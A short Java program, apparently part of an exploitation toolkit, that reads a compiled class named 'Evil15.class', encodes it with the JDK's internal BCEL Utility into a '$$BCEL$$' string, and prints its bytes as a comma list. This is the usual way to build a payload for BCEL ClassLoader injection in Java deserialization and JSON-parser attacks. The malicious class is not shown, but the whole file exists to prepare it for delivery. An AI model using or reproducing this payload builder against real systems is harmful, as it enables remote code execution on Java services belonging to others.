import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.IOException;
import java.io.InputStream;

public class EvilMake {

    public static void main(String[] args) throws IOException {
        InputStream inputStream = EvilMake.class.getClassLoader().getResourceAsStream("Evil15.class");
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String code = "$$BCEL$$" + Utility.encode(bytes, true);
        bytes = code.getBytes();
        for (int i = 0; i < bytes.length; i++) {
            System.out.print(bytes[i]);
            if (i != bytes.length - 1)
                System.out.print(",");
        }
    }
}